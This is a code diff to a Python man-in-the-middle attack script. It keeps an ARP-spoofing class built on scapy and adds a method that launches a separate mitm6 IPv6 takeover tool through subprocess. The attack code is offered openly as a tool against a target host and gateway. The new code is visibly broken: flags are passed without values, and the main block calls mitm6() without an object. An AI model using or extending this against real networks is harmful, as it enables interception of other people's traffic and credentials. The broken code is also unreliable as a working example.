@@ -1,4 +1,6 @@
 import netifaces
+import subprocess
+import os
 import ipaddress
 from scapy.all import ARP, Ether, sendp
 import logging
@@ -10,7 +12,7 @@ logging.basicConfig(
 
 
 class MITMAttack:
-    def __init__(self, target_ip, gateway_ip, interface):
+    def set_attributes(self, target_ip, gateway_ip, interface):
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.interface = interface
@@ -51,16 +53,40 @@ class MITMAttack:
         except KeyboardInterrupt:
             logging.info("\nMITM Attack Stopped.")
 
+    def mitm6(
+        self,
+        interface=None,
+        localdomain=None,
+        ipv4=None,
+        ipv6=None,
+        mac=None,
+        relay_target=None,
+    ):
+        logging.info(
+            "Attacking {} with packets from {}...".format(interface, ipv4 or ipv6)
+        )
+        path_to_executable = os.path.join(os.path.dirname(__file__), "mitm6.py")
+        command = [
+            "python3",
+            path_to_executable,
+            " --interface " if interface else "",
+            " --localdomain " if localdomain else "",
+            " --ipv4 " if ipv4 else "",
+            " --ipv6 " if ipv6 else "",
+            " --mac " if mac else "",
+            " --relay " if relay_target else "",
+        ]
+        subprocess.run(command)
+
 
 if __name__ == "__main__":
+    mitm = MITMAttack()
+
     interface = input("Enter the interface name: ")
     target_ip = input("Enter the target IP address: ")
     gateway_ip = input("Enter the gateway IP address: ")
 
     try:
-        mitm = MITMAttack(
-            target_ip=target_ip, gateway_ip=gateway_ip, interface=interface
-        )
-        mitm.run_attack()
+        mitm6()
     except ValueError as e:
         logging.error(e)
